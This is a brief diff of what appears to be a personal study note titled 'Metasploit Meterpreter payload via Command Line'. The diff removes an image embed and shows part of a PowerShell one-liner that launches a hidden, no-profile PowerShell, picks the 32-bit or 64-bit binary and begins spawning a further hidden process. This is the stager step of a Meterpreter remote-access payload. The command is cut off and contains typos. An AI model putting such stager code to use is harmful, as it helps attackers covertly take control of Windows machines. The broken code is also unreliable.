@@ -1,5 +1,5 @@
 ## Metasploit Meterpreter payload via Command Line
-![[Pasted image 20241203153728.png]]
+
 ```PowerShell
 C:\Windows\system32\cmd.exe /b/c start /b /min powershell.exe -nop -w hidden -c if ((IntPtr]::Size -eq
 4) { $b='powershell.exe' }else{ $b=$env: windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe' }; $s=New-Object System.Diagnostics. ProcessStartInfo; $s.FileName=$b; $s. Arguments='-nop -w hidden -c $s-New-Object
